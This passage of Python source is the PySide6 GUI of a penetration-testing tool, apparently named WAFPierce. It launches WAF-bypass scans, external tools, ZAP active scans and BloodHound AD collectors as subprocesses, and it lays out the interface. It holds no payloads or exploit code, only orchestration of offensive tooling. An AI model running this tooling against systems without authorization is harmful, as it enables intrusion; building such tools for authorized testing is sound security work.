                        new_progress = max(new_progress, 15)
                    if 'detected waf' in line_lower or 'no known waf' in line_lower:
                        new_progress = max(new_progress, 20)
                    # Phase 3: OS Detection (20-30%)
                    if 'phase 2' in line_lower or 'os detection' in line_lower:
                        new_progress = max(new_progress, 25)
                    # Phase 4: Testing techniques (30-90%)
                    if 'phase 3' in line_lower or 'testing bypass' in line_lower:
                        new_progress = max(new_progress, 35)
                    if 'loading category' in line_lower:
                        new_progress = max(new_progress, 40)
                    if 'running' in line_lower and 'techniques' in line_lower:
                        new_progress = max(new_progress, 45)
                    
                    # Increment progress slowly for each output line during testing phase
                    if new_progress >= 45:
                        # Slow linear increment - add 0.3% per line, capped at 90%
                        new_progress = min(90, new_progress + 0.3)
                    
                    # Completing
                    if 'warning:' in line_lower and 'techniques encountered errors' in line_lower:
                        new_progress = max(new_progress, 95)
                    if 'scan complete' in line_lower or 'finished' in line_lower:
                        new_progress = max(new_progress, 98)
                    
                    # Only update if progress increased (ensures linear progression)
                    if new_progress > current_progress:
                        current_progress = new_progress
                        try:
                            self.progress_update.emit(target, int(current_progress))
                        except Exception as e:
                            pass
                
                for attempt in range(self.retry_failed + 1):
                    if self._abort:
                        break
                    if attempt == 0:
                        self.log_line.emit(f"\n[*] Starting target {idx}/{len(self.targets)}: {target}\n")
                        self.progress_update.emit(target, 0)
                    else:
                        self.log_line.emit(f"[!] Retrying {target} (attempt {attempt + 1}/{self.retry_failed + 1})\n")
                        self.target_update.emit(target, 'Retrying', idx)
                    self.target_update.emit(target, 'Running', idx)

                    tmpf = tempfile.NamedTemporaryFile(delete=False, suffix='.json')
                    tmpf.close()
                    tmp_path = tmpf.name
                    try:
                        self.tmp_created.emit(target, tmp_path)
                    except Exception:
                        pass

                    log_lines = []
                    
                    # Use -u flag for unbuffered Python output to get real-time streaming
                    if IS_FROZEN:
                        cmd = [
                            sys.executable,
                            '--scan-worker',
                            '--target', target,
                            '--threads', str(self.threads),
                            '--delay', str(self.delay),
                            '--output', tmp_path,
                        ]
                    else:
                        cmd = [sys.executable, '-u', '-m', 'wafpierce.pierce', target, '-t', str(self.threads), '-d', str(self.delay), '-o', tmp_path]
                    # Add categories if specified
                    if self.selected_categories and len(self.selected_categories) > 0:
                        if IS_FROZEN:
                            cmd.extend(['--categories', ','.join(self.selected_categories)])
                        else:
                            cmd.extend(['-c', ','.join(self.selected_categories)])
                    # v1.6 advanced options -> CLI flags (same flags in both the
                    # frozen --scan-worker and the `python -m` paths).
                    cmd.extend(self._advanced_flags())
                    env = os.environ.copy()
                    env['PYTHONIOENCODING'] = 'utf-8'
                    env['PYTHONUNBUFFERED'] = '1'  # Force unbuffered output
                    # Pass AI keys via env (not argv) so secrets are not visible
                    # in the process list.
                    if self.advanced_opts.get('ai_triage') and self.advanced_opts.get('ai_key'):
                        provider = str(self.advanced_opts.get('ai_provider') or 'anthropic')
                        if provider == 'anthropic':
                            env['ANTHROPIC_API_KEY'] = str(self.advanced_opts['ai_key'])
                        else:
                            env['AI_API_KEY'] = str(self.advanced_opts['ai_key'])
                    try:
                        proc = subprocess.Popen(
                            cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            text=True,
                            encoding='utf-8',
                            errors='replace',
                            bufsize=1,  # Line buffered
                            env=env
                        )
                    except Exception as e:
                        self.log_line.emit(f"[!] Failed to start scanner for {target}: {e}\n")
                        last_status = 'Error'
                        continue

                    self._running_procs[target] = proc

                    try:
                        if proc.stdout is not None:
                            for line in proc.stdout:
                                log_lines.append(line)
                                self.log_line.emit(line)
                                update_progress_from_line(line)
                                if self._abort:
                                    try:
                                        from .tools_runtime import kill_proc_tree
                                        kill_proc_tree(proc)
                                    except Exception:
                                        try:
                                            proc.terminate()
                                        except Exception:
                                            pass
                                    break
                    except Exception as e:
                        self.log_line.emit(f"[!] Error reading output for {target}: {e}\n")

                    proc.wait()
                    self._running_procs.pop(target, None)

                    if os.path.exists(tmp_path):
                        try:
                            with open(tmp_path, 'r', encoding='utf-8') as f:
                                data = json.load(f)
                                done_list = data if isinstance(data, list) else []
                                if isinstance(data, list):
                                    # Add target URL to each result
                                    for item in data:
                                        if isinstance(item, dict) and 'target' not in item:
                                            item['target'] = target
                                    self.log_line.emit(f"[+] Loaded {len(data)} result(s) from {tmp_path}\n")
                                    try:
                                        self.results_emitted.emit(data)
                                    except Exception:
                                        pass
                                    # parse errors from log_lines
                                    errors = []
                                    joined = '\n'.join(log_lines).lower()
                                    import re
                                    m = re.search(r"\[!\] Warning: (\d+) techniques encountered errors", joined)
                                    if m:
                                        try:
                                            cnt = int(m.group(1))
                                            errors.append(f"{cnt} technique errors")
                                        except Exception:
                                            pass
                                    # also collect traceback / exception lines
                                    for ln in log_lines:
                                        low = ln.lower()
                                        if 'traceback' in low or 'exception' in low or 'error:' in low:
                                            errors.append(ln.strip())
                                    try:
                                        self.target_summary.emit(target, done_list, errors)
                                    except Exception:
                                        pass
                                    success = True
                                    done_count = len(done_list)
                                    last_status = 'Done'
                                    self.progress_update.emit(target, 100)
                                    break
                                else:
                                    self.log_line.emit(f"[!] Results file for {target} did not contain a list\n")
                                    last_status = 'NoResults'
                        except Exception as e:
                            # Only log if this is a real error, not just empty/no results
                            if os.path.exists(tmp_path):
                                try:
                                    with open(tmp_path, 'r', encoding='utf-8') as f:
                                        content = f.read().strip()
                                        if content:
                                            self.log_line.emit(f"[!] Failed to parse results for {target}: {e}\n")
                                            last_status = 'Error'
                                        else:
                                            self.log_line.emit(f"[!] No results found for {target}\n")
                                            last_status = 'NoResults'
                                except Exception:
                                    self.log_line.emit(f"[!] No results for {target}\n")
                                    last_status = 'NoResults'
                            else:
                                self.log_line.emit(f"[!] No results file generated for {target}\n")
                                last_status = 'NoResults'

                if self._abort:
                    self.log_line.emit('[!] Scan aborted by user\n')
                    self.target_update.emit(target, 'Aborted', 0)
                elif success:
                    self.target_update.emit(target, 'Done', done_count)
                    self.progress_update.emit(target, 100)
                else:
                    self.target_update.emit(target, last_status or 'Error', 0)

            # run with a small thread pool inside this QThread
            try:
                with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
                    futures = [ex.submit(run_one, target, idx) for idx, target in enumerate(self.targets, start=1)]
                    for fut in concurrent.futures.as_completed(futures):
                        if self._abort:
                            # terminate any remaining procs
                            for p in list(self._running_procs.values()):
                                try:
                                    p.terminate()
                                except Exception:
                                    pass
                            break
            except Exception as e:
                self.log_line.emit(f"[!] Worker execution error: {e}\n")

            self.finished.emit()

    class ToolRunWorker(QObject):
        """Runs one external pentest tool via tools_runtime.run_tool on a QThread,
        streams its output line-by-line, and emits the normalized findings. Killable
        through abort() (tree-kill), mirroring the QtWorker scan model."""
        log_line = Signal(str)
        status = Signal(str)
        finished = Signal(object)   # list[finding dict]

        def __init__(self, tool_key, target, custom_path=None, extra_args=None,
                     api_key=None, wordlist=None, parent=None):
            super().__init__(parent)
            self.tool_key = tool_key
            self.target = target
            self.custom_path = custom_path or None
            self.extra_args = extra_args or None
            self.api_key = api_key or None
            self.wordlist = wordlist or None
            self._proc = None
            self._abort = False

        def abort(self):
            self._abort = True
            try:
                from .tools_runtime import kill_proc_tree
                kill_proc_tree(self._proc)
            except Exception:
                pass

        def run(self):
            findings = []
            try:
                from .tools_runtime import run_tool
                res = run_tool(
                    self.tool_key, self.target,
                    custom_path=self.custom_path,
                    extra_args=self.extra_args,
                    wordlist=self.wordlist,
                    api_key=self.api_key,
                    on_line=lambda ln: self.log_line.emit(ln),
                    register_proc=lambda p: setattr(self, '_proc', p),
                )
                if res.get('ok'):
                    findings = res.get('findings', []) or []
                    self.log_line.emit(f"[+] {self.tool_key}: {len(findings)} finding(s)")
                    self.status.emit('done')
                else:
                    self.log_line.emit(f"[!] {self.tool_key}: {res.get('error') or res.get('state')}")
                    self.status.emit(res.get('state', 'error'))
            except Exception as e:
                self.log_line.emit(f"[!] {self.tool_key} worker error: {e}")
                self.status.emit('error')
            self.finished.emit(findings)

    class PipelineWorker(QObject):
        """Runs a pipeline definition via pipeline.PipelineRunner on a QThread,
        streaming logs + per-stage status and emitting findings as stages complete.
        Killable via abort() (tree-kills the active stage's child process)."""
        log_line = Signal(str)
        stage_update = Signal(str, str)   # (stage_id, status)
        findings = Signal(object)
        finished = Signal()

        def __init__(self, pdef, target, parent=None):
            super().__init__(parent)
            self.pdef = pdef
            self.target = target
            self._proc = None
            self._abort = False

        def abort(self):
            self._abort = True
            try:
                from .tools_runtime import kill_proc_tree
                kill_proc_tree(self._proc)
            except Exception:
                pass

        def run(self):
            try:
                from .pipeline import PipelineRunner, PipelineHooks
                hooks = PipelineHooks(
                    on_log=lambda m: self.log_line.emit(m),
                    on_stage=lambda sid, st: self.stage_update.emit(sid, st),
                    on_findings=lambda items: self.findings.emit(items),
                    register_proc=lambda p: setattr(self, '_proc', p),
                    is_aborted=lambda: self._abort,
                )
                PipelineRunner(self.pdef, self.target, hooks=hooks, frozen=IS_FROZEN).run()
            except Exception as e:
                self.log_line.emit(f'[!] Pipeline error: {e}')
            self.finished.emit()

    class ZapWorker(QObject):
        """Drives a ZAP spider + active-scan on a QThread and emits the resulting
        normalized findings. Cooperatively abortable (stops the active scan via the
        ZAP API on abort)."""
        log_line = Signal(str)
        findings = Signal(object)
        finished = Signal()

        def __init__(self, host, port, apikey, target, do_spider=True, do_ascan=True, parent=None):
            super().__init__(parent)
            self.host = host; self.port = port; self.apikey = apikey; self.target = target
            self.do_spider = do_spider; self.do_ascan = do_ascan
            self._abort = False

        def abort(self):
            self._abort = True

        def run(self):
            items = []
            try:
                from .tooldrivers import ZAPClient
                client = ZAPClient(self.host, int(self.port), self.apikey)
                items = client.run_full(self.target, on_log=lambda m: self.log_line.emit(m),
                                        is_aborted=lambda: self._abort,
                                        do_spider=self.do_spider, do_ascan=self.do_ascan)
            except Exception as e:
                self.log_line.emit(f'[!] ZAP error: {e}')
            self.findings.emit(items)
            self.finished.emit()

    class AdCollectorWorker(QObject):
        """Runs a BloodHound collector (SharpHound/AzureHound) as a killable
        subprocess on a QThread, streaming output. Tree-killable via abort()."""
        log_line = Signal(str)
        finished = Signal(str)   # output_dir

        def __init__(self, argv, output_dir, parent=None):
            super().__init__(parent)
            self.argv = argv
            self.output_dir = output_dir
            self._proc = None
            self._abort = False

        def abort(self):
            self._abort = True
            try:
                from .tools_runtime import kill_proc_tree
                kill_proc_tree(self._proc)
            except Exception:
                pass

        def run(self):
            try:
                from .tools_runtime import popen_killable
                self.log_line.emit('[*] ' + ' '.join(self.argv))
                self._proc = popen_killable(self.argv, stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT, text=True,
                                            bufsize=1, errors='replace')
                if self._proc.stdout is not None:
                    for line in self._proc.stdout:
                        self.log_line.emit(line.rstrip())
                        if self._abort:
                            break
                self._proc.wait()
            except Exception as e:
                self.log_line.emit(f'[!] collector error: {e}')
            self.finished.emit(self.output_dir)

    class ProxySignals(QObject):
        """Thread bridge for the built-in proxy: the proxy daemon thread emits
        flow_captured; a GUI-thread slot persists it to sqlite + updates widgets
        (the ONLY thing that may cross threads — R1 cross-thread safety).
        result_ready carries a Repeater response back from its send thread."""
        flow_captured = Signal(object)
        result_ready = Signal(object)

    class PierceQtApp(QWidget):
        def __init__(self):
            super().__init__()
            # Get current language
            self._lang = _load_prefs().get('language', 'en')
            self.setWindowTitle(_t('window_title', self._lang))

            self._worker_thread = None
            self._worker = None
            self._stop_requested = False
            self._results = []
            self._tmp_result_paths = []
            self._target_tmp_map = {}
            # per-target storage for Qt: {'done': [], 'errors': [], 'tmp': path}
            self._per_target_results = {}
            
            # Initialize database for persistent storage
            try:
                WAFPierceDB = None
                try:
                    from .database import WAFPierceDB
                except ImportError:
                    try:
                        from wafpierce.database import WAFPierceDB
                    except ImportError:
                        import sys
                        import os
                        parent_dir = os.path.dirname(os.path.abspath(__file__))
                        if parent_dir not in sys.path:
                            sys.path.insert(0, parent_dir)
                        from database import WAFPierceDB
                
                if WAFPierceDB:
                    self._db = WAFPierceDB()
                else:
                    self._db = None
            except Exception as e:
                print(f"[!] Database initialization failed: {e}")
                self._db = None
            
            # Current scan ID for database tracking
            self._current_scan_id = None
            self._current_engagement_id = None
            
            # Proxy settings
            self._proxy_config = None
            
            # Forensics settings
            self._enable_http_logging = False
            self._enable_ssl_analysis = False
            self._http_log = []
            self._ssl_info = {}
            
            # Privacy settings
            self._censor_sites = False
            
            # Easter egg state
            self._konami_sequence = []
            self._konami_code = ['up', 'up', 'down', 'down', 'left', 'right', 'left', 'right', 'b', 'a']
            self._title_clicks = 0
            self._hacker_mode = False

            # load prefs and build UI
            try:
                self._prefs = _load_prefs()
                # Load forensics settings
                self._enable_http_logging = bool(self._prefs.get('enable_http_logging', False))
                self._enable_ssl_analysis = bool(self._prefs.get('enable_ssl_analysis', False))
                # Load privacy settings
                self._censor_sites = bool(self._prefs.get('censor_sites', False))
            except Exception:
                self._prefs = {'theme': 'dark', 'font_size': 11}
            try:
                size = self._prefs.get('qt_geometry', '1240x780')
                if isinstance(size, str) and 'x' in size:
                    w, h = size.split('x', 1)
                    self.resize(int(float(w)), int(float(h)))
                else:
                    self.resize(1240, 780)
            except Exception:
                self.resize(1240, 780)
            self._build_ui()
            self._setup_keyboard_shortcuts()
            try:
                self._apply_qt_prefs(self._prefs)
            except Exception:
                pass
            try:
                self._restore_qt_targets()
            except Exception:
                pass
            try:
                self._restore_persistent_results()
            except Exception:
                pass
            try:
                self._restore_scan_queue()
            except Exception:
                pass

        def _setup_keyboard_shortcuts(self):
            """Setup keyboard shortcuts for quick actions."""
            try:
                from PySide6.QtGui import QShortcut, QKeySequence
                
                # Ctrl+R - Start scan
                QShortcut(QKeySequence('Ctrl+R'), self, self.start_scan)
                
                # Ctrl+S - Save results
                QShortcut(QKeySequence('Ctrl+S'), self, self.save_results)
                
                # Ctrl+I - Import targets
                QShortcut(QKeySequence('Ctrl+I'), self, self._import_targets_dialog)
                
                # Ctrl+D - Dashboard
                QShortcut(QKeySequence('Ctrl+D'), self, lambda: self._navigate('dashboard'))
                
                # Ctrl+E - Results explorer
                QShortcut(QKeySequence('Ctrl+E'), self, lambda: self._navigate('results'))
                
                # Ctrl+, - Settings
                QShortcut(QKeySequence('Ctrl+,'), self, lambda: self._navigate('settings'))
                
                # Ctrl+P - Custom Payloads
                QShortcut(QKeySequence('Ctrl+P'), self, lambda: self._navigate('payloads'))
                
                # Escape - Stop scan
                QShortcut(QKeySequence('Escape'), self, self.stop_scan)
                
                # F5 - Refresh/Start scan
                QShortcut(QKeySequence('F5'), self, self.start_scan)
                
                # Ctrl+L - Timeline
                QShortcut(QKeySequence('Ctrl+L'), self, lambda: self._navigate('timeline'))

                # Ctrl+M - Plugin Manager
                QShortcut(QKeySequence('Ctrl+M'), self, lambda: self._navigate('plugins'))
                
            except Exception:
                pass

        def _restore_persistent_results(self):
            """Restore persistent target results from database."""
            if not self._db:
                return
            try:
                persistent = self._db.get_persistent_targets()
                for p in persistent:
                    target = p.get('target', '')
                    status = p.get('status', 'queued')
                    findings_count = p.get('findings_count', 0)
                    results_json = p.get('results_json')
                    
                    # Check if target already in tree (use data for comparison)
                    existing = [self.tree.topLevelItem(i).data(0, 256) or self.tree.topLevelItem(i).text(0) for i in range(self.tree.topLevelItemCount())]
                    if target not in existing:
                        # Add to tree with censored display
                        display_text = self._censor(target)
                        it = QTreeWidgetItem([display_text, f'{status} ({findings_count})' if findings_count > 0 else status, ''])
                        it.setData(0, 256, target)  # Store actual URL in UserRole
                        self.tree.addTopLevelItem(it)
                        
                        # Create progress bar for this item
                        self._create_progress_bar_for_item(it, target)
                        
                        # Set progress to 100% if done
                        if 'done' in status.lower():
                            if target in self._progress_bars:
                                self._progress_bars[target].setValue(100)
                        
                        # Set background color based on status
                        if 'done' in status.lower():
                            try:
                                it.setBackground(0, QBrush(QColor('#163f19')))
                            except Exception:
                                pass
                        
                        # Restore results
                        if results_json:
                            try:
                                results = json.loads(results_json)
                                if results:
                                    self._results.extend(results)
                                    self._per_target_results[target] = {'done': results, 'errors': [], 'tmp': None}
                            except Exception:
                                pass
                
                # Enable results button if we have restored results
                if self._results:
                    try:
                        self.save_btn.setEnabled(True)
                        self.results_btn.setEnabled(True)
                    except Exception:
                        pass
            except Exception:
                pass
        
        def _restore_scan_queue(self):
            """Restore scan queue state from previous session."""
            if not self._db:
                return
            try:
                saved_queue = self._db.get_scan_queue()
                restored_count = 0
                for item in saved_queue:
                    target = item.get('target', '')
                    status = item.get('status', 'queued')
                    
                    # Check if target already in tree (use data for comparison)
                    existing = [self.tree.topLevelItem(i).data(0, 256) or self.tree.topLevelItem(i).text(0) for i in range(self.tree.topLevelItemCount())]
                    if target and target not in existing:
                        # Add to tree with censored display
                        display_text = self._censor(target)
                        it = QTreeWidgetItem([display_text, status, ''])
                        it.setData(0, 256, target)  # Store actual URL in UserRole
                        self.tree.addTopLevelItem(it)
                        
                        # Create progress bar for this item
                        self._create_progress_bar_for_item(it, target)
                        
                        # Set progress based on status
                        if 'done' in status.lower():
                            if target in self._progress_bars:
                                self._progress_bars[target].setValue(100)
                            try:
                                it.setBackground(0, QBrush(QColor('#163f19')))
                            except Exception:
                                pass
                        
                        restored_count += 1
                
                # Clear the saved queue after restoration
                if restored_count > 0:
                    self._db.clear_scan_queue()
                    self.append_log(f"[*] {_t('queue_restored', self._lang).format(count=restored_count)}")
            except Exception:
                pass

        def _nav_button(self, glyph, label, slot, active=False):
            from PySide6.QtWidgets import QPushButton
            from PySide6.QtCore import Qt
            btn = QPushButton(f"  {glyph}   {label}")
            btn.setObjectName('NavButton')
            try:
                btn.setCursor(Qt.PointingHandCursor)
            except Exception:
                pass
            if slot:
                try:
                    btn.clicked.connect(slot)
                except Exception:
                    pass
            btn.setProperty('active', 'true' if active else 'false')
            btn.setMinimumHeight(34)
            return btn

        def _build_sidebar(self):
            """Build the left navigation rail (brand + nav actions + version)."""
            from PySide6.QtWidgets import QFrame, QVBoxLayout, QHBoxLayout, QLabel, QScrollArea
            from PySide6.QtGui import QPixmap
            from PySide6.QtCore import Qt

            bar = QFrame()
            bar.setObjectName('Sidebar')
            bar.setFixedWidth(212)
            lay = QVBoxLayout(bar)
            lay.setContentsMargins(16, 18, 16, 16)
            lay.setSpacing(6)

            # Brand: logo + wordmark
            brand = QHBoxLayout()
            brand.setSpacing(10)
            logo = QLabel()
            try:
                if os.path.exists(SIDEBAR_LOGO_PATH):
                    pm = QPixmap(SIDEBAR_LOGO_PATH)
                    if not pm.isNull():
                        logo.setPixmap(pm.scaledToHeight(30, Qt.SmoothTransformation))
            except Exception:
                pass
            brand.addWidget(logo)
            name_box = QVBoxLayout()
            name_box.setSpacing(0)
            name_lbl = QLabel(PRODUCT_NAME)
            name_lbl.setObjectName('BrandName')
            tag_lbl = QLabel(f"v{'.'.join(__version__.split('.')[:2])}")
            tag_lbl.setObjectName('BrandTag')
            name_box.addWidget(name_lbl)
            name_box.addWidget(tag_lbl)
            brand.addLayout(name_box)
            brand.addStretch()
            lay.addLayout(brand)
            lay.addSpacing(12)

            # Nav items map to existing actions/pages. Grouping keeps the
            # bug-bounty workspace scannable without removing any current tool.
            self._nav_buttons = {}
            nav_scroll = QScrollArea()
            nav_scroll.setObjectName('SidebarScroll')
            nav_scroll.setFrameShape(QFrame.NoFrame)
            nav_scroll.setWidgetResizable(True)
            nav_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
            nav_scroll.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
            nav_body = QFrame()
            nav_body.setObjectName('SidebarNavBody')
            nav_lay = QVBoxLayout(nav_body)
            nav_lay.setContentsMargins(0, 0, 0, 0)
            nav_lay.setSpacing(4)
            nav_groups = [
                ('OPERATE', [
                    ('scan', '◉', 'Scan', True),
                    ('pipeline', '⛓', 'Pipeline', False),
                    ('ai', '✦', 'AI / Automation', False),
                    ('recon', '◈', 'Recon', False),
                    ('browser', '◍', 'Browser', False),
                    ('proxy', '◌', 'Proxy', False),
                ]),
                ('ANALYZE', [
                    ('results', '◆', 'Results', False),
                    ('dashboard', '▦', 'Dashboard', False),
                    ('timeline', '☰', 'Timeline', False),
                    ('live', '◰', 'Live Logs', False),
                ]),
                ('TOOLS', [
                    ('tools', '⚒', 'External Tools', False),
                    ('repeater', '↻', 'Repeater', False),
                    ('fuzzer', '⌗', 'Fuzzer', False),
                    ('sqli', '⛁', 'SQLi', False),
                    ('secrets', '⚷', 'Secrets', False),
                    ('payloads', '⚑', 'Payloads', False),
                    ('zapburp', '◧', 'ZAP/Burp', False),
                    ('adint', '◇', 'AD / Internal', False),
                ]),
                ('MANAGE', [
                    ('engagements', '◎', 'Engagements', False),
                    ('schedule', '◷', 'Schedule', False),
                    ('plugins', '❖', 'Plugins', False),
                    ('settings', '⚙', 'Settings', False),
                ]),
            ]
            for group, items in nav_groups:
                section = QLabel(group)
                section.setObjectName('NavSection')
                nav_lay.addWidget(section)
                for key, glyph, label, active in items:
                    # All sections route through the single-page navigator so the
                    # central panel swaps in place instead of opening dialogs.
                    btn = self._nav_button(glyph, label,
                                           (lambda checked=False, k=key: self._navigate(k)),
                                           active)
                    self._nav_buttons[key] = btn
                    nav_lay.addWidget(btn)
                nav_lay.addSpacing(6)

            nav_lay.addStretch()
            nav_scroll.setWidget(nav_body)
            lay.addWidget(nav_scroll, 1)

            ver = QLabel(f'v{__version__}')
            ver.setObjectName('SidebarVersion')
            lay.addWidget(ver)
            return bar

        def _build_ui(self):
            # New shell: left navigation rail + main content area.
            root = QHBoxLayout(self)
            root.setContentsMargins(0, 0, 0, 0)
            root.setSpacing(0)
            self._layout_root = root

            sidebar = self._build_sidebar()
            root.addWidget(sidebar)

            content = QWidget()
            content.setObjectName('Content')
            content_outer = QVBoxLayout(content)
            content_outer.setContentsMargins(0, 0, 0, 0)
            content_outer.setSpacing(0)
            root.addWidget(content, 1)

            # Single-page shell: every nav section is a page in this stack, so
            # switching sections never tears down a running scan/recon — the
            # worker thread and recon QProcess live on the app, not the page.
            self._stack = QtWidgets.QStackedWidget()
            content_outer.addWidget(self._stack)
            self._pages = {}          # key -> built page widget (cached)
            self._page_keys = []      # nav order (for reference)

            # Page 0 = the Scan view (the existing scan UI builds into `v`).
            scan_page = QWidget()
            scan_page.setObjectName('ScanPage')
            v = QVBoxLayout(scan_page)
            v.setContentsMargins(22, 20, 22, 20)
            v.setSpacing(14)
            self._layout_main = v
            scan_holder = self._wrap_scroll(scan_page)
            self._stack.addWidget(scan_holder)
            self._pages['scan'] = scan_holder

            # top controls
            top = QHBoxLayout()
            self._layout_top = top
            self.target_edit = QLineEdit()
            try:
                self.target_edit.setPlaceholderText('https://example.com')
                # Easter egg: special target commands
                self.target_edit.textChanged.connect(self._check_easter_egg_input)
            except Exception:
                pass
            add_btn = QPushButton(_t('add', self._lang))
            add_btn.clicked.connect(self.add_target)
            remove_btn = QPushButton(_t('remove', self._lang))
            remove_btn.clicked.connect(self.remove_selected)
            target_lbl = QLabel(_t('target_url', self._lang))
            target_lbl.setObjectName('FieldLabel')
            target_lbl.setFixedWidth(96)
            top.addWidget(target_lbl)
            top.addWidget(self.target_edit)
            top.addWidget(add_btn)
            top.addWidget(remove_btn)
            
            # Import button
            try:
                import_btn = QPushButton('📥 ' + _t('import_targets', self._lang) if 'import_targets' in TRANSLATIONS.get(self._lang, {}) else '📥 Import')
                import_btn.setFixedHeight(28)
                import_btn.clicked.connect(self._import_targets_dialog)
                top.addWidget(import_btn)

                import_scan_btn = QPushButton('📂 Import JSON')
                import_scan_btn.setFixedHeight(28)
                import_scan_btn.setToolTip('Import saved scan results JSON')
                import_scan_btn.clicked.connect(self._import_scan_json_dialog)
                top.addWidget(import_scan_btn)
            except Exception:
                pass
            
            # Navigation actions now live in the left sidebar; keep the target
            # row left-aligned by absorbing remaining space on the right.
            top.addStretch()
            v.addLayout(top)

            # options (threads / delay)
            opts = QHBoxLayout()
            self._layout_opts = opts
            self.threads_spin = QSpinBox()
            self.threads_spin.setRange(1, 200)
            try:
                self.threads_spin.setValue(int(self._prefs.get('threads', 5)))
            except Exception:
                self.threads_spin.setValue(5)
            self.delay_spin = QDoubleSpinBox()
            self.delay_spin.setRange(0.0, 5.0)
            self.delay_spin.setSingleStep(0.05)
            try:
                self.delay_spin.setValue(float(self._prefs.get('delay', 0.2)))
            except Exception:
                self.delay_spin.setValue(0.2)
            self.concurrent_spin = QSpinBox()
            self.concurrent_spin.setRange(1, 200)
            try:
                self.concurrent_spin.setValue(int(self._prefs.get('concurrent', 2)))
            except Exception:
                self.concurrent_spin.setValue(2)
            # default to sequential execution (one target at a time)
            self.use_concurrent_chk = QCheckBox(_t('use_concurrent', self._lang))
            try:
                self.use_concurrent_chk.setChecked(bool(self._prefs.get('use_concurrent', False)))
            except Exception:
                self.use_concurrent_chk.setChecked(False)
            threads_lbl = QLabel(_t('threads', self._lang)); threads_lbl.setObjectName('FieldLabel')
            concurrent_lbl = QLabel(_t('concurrent', self._lang)); concurrent_lbl.setObjectName('FieldLabel')
            delay_lbl = QLabel(_t('delay', self._lang)); delay_lbl.setObjectName('FieldLabel')
            for _lbl in (threads_lbl, concurrent_lbl, delay_lbl):
                _lbl.setFixedWidth(86)
            self.threads_spin.setFixedWidth(76)
            self.concurrent_spin.setFixedWidth(76)
            self.delay_spin.setFixedWidth(86)
            opts.addWidget(threads_lbl)
            opts.addWidget(self.threads_spin)
            opts.addWidget(concurrent_lbl)
            opts.addWidget(self.concurrent_spin)
            opts.addWidget(self.use_concurrent_chk)
            opts.addSpacing(10)
            opts.addWidget(delay_lbl)
            opts.addWidget(self.delay_spin)
            v.addLayout(opts)

            try:
                v.addWidget(self._build_scan_profile_panel())
            except Exception:
                pass

            # legend for status colors
            try:
                legend_h = QHBoxLayout()
                # keep references so we can update counts live
                self._legend_labels = {}
                def _legend_label(key, text, color):
                    lbl = QLabel(f"{text} (0)")
                    lbl.setStyleSheet(f'background:{color}; padding:4px; color: white; border-radius:3px')
                    self._legend_labels[key] = lbl
                    return lbl
                legend_h.addWidget(_legend_label('queued', _t('queued', self._lang), '#2a3340'))
                legend_h.addWidget(_legend_label('running', _t('running', self._lang), '#6366f1'))
                legend_h.addWidget(_legend_label('done', _t('done', self._lang), '#15331f'))
                legend_h.addWidget(_legend_label('error', _t('error', self._lang), '#ef4444'))
                v.addLayout(legend_h)
            except Exception:
                pass

            # middle: tree and log
            middle = QHBoxLayout()
            self._layout_middle = middle
            self.tree = QTreeWidget()
            self.tree.setColumnCount(3)
            self.tree.setHeaderLabels([_t('target', self._lang), _t('status', self._lang), _t('progress', self._lang) if 'progress' in TRANSLATIONS.get(self._lang, {}) else 'Progress'])
            try:
                header = self.tree.header()
                header.setStretchLastSection(True)  # Let the last section (Progress) stretch
                header.setSectionResizeMode(0, QHeaderView.Stretch)
                header.setSectionResizeMode(1, QHeaderView.Fixed)
                header.setSectionResizeMode(2, QHeaderView.Stretch)  # Progress column stretches
                self.tree.setColumnWidth(1, 100)
                self.tree.setColumnWidth(2, 200)  # Wider progress column
                self.tree.setMinimumWidth(500)  # Ensure tree is wide enough
            except Exception:
                pass
            # Store progress bars for each target
            self._progress_bars = {}
            self.tree.itemDoubleClicked.connect(self.show_target_details)
            # single-click status to open details as well
            try:
                self.tree.itemClicked.connect(self._on_qt_item_clicked)
            except Exception:
                pass
            middle.addWidget(self.tree, 2)

            right_v = QVBoxLayout()
            self._layout_right = right_v
            self.log = QTextEdit()
            self.log.setReadOnly(True)
            # Prefer modern fonts for Qt widgets when available
            try:
                mono_candidates = ["JetBrains Mono", "Fira Code", "Consolas", "DejaVu Sans Mono", "Courier New"]
                try:
                    families = set(QFontDatabase.families())
                except Exception:
                    # fallback when API differs or method is not available
                    try:
                        families = set(QFontDatabase().families())
                    except Exception:
                        families = set()
                mono = next((f for f in mono_candidates if f in families), None)
                if mono:
                    self.log.setFont(QFont(mono, 10))
                else:
                    ui_candidates = ["Segoe UI", "Inter", "Helvetica", "Arial"]
                    ui = next((f for f in ui_candidates if f in families), None)
                    if ui:
                        self.log.setFont(QFont(ui, 10))
            except Exception:
                pass
            # attempt to set a faint watermark background using the bundled logo
            try:
                if os.path.exists(LOGO_PATH):
                    # Always use dark mode opacity
                    opacity = 0.08
                    tmp = self._create_qt_watermark(opacity)
                    if tmp and os.path.exists(tmp):
                        try:
                            from pathlib import Path
                            css_path = Path(tmp).as_posix()
                        except Exception:
                            css_path = tmp.replace('\\', '/')
                        self.log.setStyleSheet(
                            "QTextEdit {"
                            f" background-image: url('{css_path}');"
                            " background-repeat: no-repeat; background-position: center; background-attachment: fixed;"
                            " background-color: #12161d; color: #e6eaf0;"
                            " border: 1px solid #262f3b; border-radius: 10px; padding: 8px; }"
                        )
            except Exception:
                pass
            # Total progress bar above output
            total_progress_layout = QHBoxLayout()
            total_progress_label = QLabel(_t('total_progress', self._lang) if 'total_progress' in TRANSLATIONS.get(self._lang, {}) else 'Total Progress:')
            total_progress_label.setFixedWidth(120)
            self._total_progress_bar = QProgressBar()
            self._total_progress_bar.setMinimum(0)
            self._total_progress_bar.setMaximum(100)
            self._total_progress_bar.setValue(0)
            self._total_progress_bar.setTextVisible(True)
            self._total_progress_bar.setFormat('%p%')
            self._total_progress_bar.setFixedHeight(22)
            self._total_progress_bar.setStyleSheet('''
                QProgressBar {
                    border: 1px solid #262f3b;
                    border-radius: 7px;
                    background-color: #1a212b;
                    text-align: center;
                    color: #e6eaf0;
                    font-size: 12px;
                    font-weight: bold;
                }
                QProgressBar::chunk {
                    background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                        stop:0 #4f52d6, stop:1 #6366f1);
